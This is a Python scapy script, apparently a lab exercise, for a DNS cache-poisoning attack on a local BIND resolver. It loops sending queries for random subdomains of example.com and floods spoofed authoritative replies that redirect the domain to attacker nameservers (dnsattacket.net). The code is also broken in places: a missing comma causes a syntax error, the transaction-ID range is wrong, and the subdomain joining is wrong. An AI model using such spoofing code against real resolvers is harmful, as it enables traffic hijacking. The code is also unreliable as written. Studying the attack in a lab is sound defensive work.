#!/usr/bin/env python
import argparse
import socket

from scapy.all import DNS, DNSQR, DNSRR
from random import randint, choice
from string import ascii_lowercase, digits


parser = argparse.ArgumentParser()
parser.add_argument(
    "--dns_port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument(
    "--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = '127.0.0.1'
# your bind's port (DNS queries are send to this port)
my_port = args.dns_port
# port that your bind uses to send its DNS queries
my_query_port = args.query_port

target_domain = 'example.com'

'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
    return ''.join(choice(ascii_lowercase + digits) for _ in range(10))


'''
Generates random 8-bit integer.
'''
def getRandomTXID():
    return randint(0, 256)


'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))


'''
Example code that sends a DNS query using scapy.
'''
def exampleSendDNSQuery():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    
    dns_packet = DNS(rd=1, qd=DNSQR(qname=target_domain))
    
    spoof_res = DNS(id=getRandomTXID(), qr=1, aa=1, nscount = 2
                        qd=DNSQR(qname=target_domain), 
                        an=DNSRR(rrname=target_domain, ttl=70000, rdata='1.2.3.4', rdlen=4, type=1),
                        ns=[
                            DNSRR(rrname=target_domain, type = 'NS', rclass = 'IN', ttl = 82046,  rdata= 'ns1.dnsattacket.net'), 
                            DNSRR(rrname=target_domain, type = 'NS', rclass = 'IN', ttl = 82046,  rdata= 'ns2.dnsattacket.net')
                           ],
                        ar=None
                        )
    while True:
        # Query the BIND server for a random DNS request
        random_domain = getRandomSubDomain() + target_domain
        dns_packet.qd.qname = random_domain
        sendPacket(sock, dns_packet, my_ip, my_port)
        
        # Flood the cache with a stream of spoofed DNS replies
        for i in range(30):
            spoof_res.id = getRandomTXID()
            sendPacket(sock, spoof_res, my_ip, my_query_port)


if __name__ == '__main__':
    exampleSendDNSQuery()
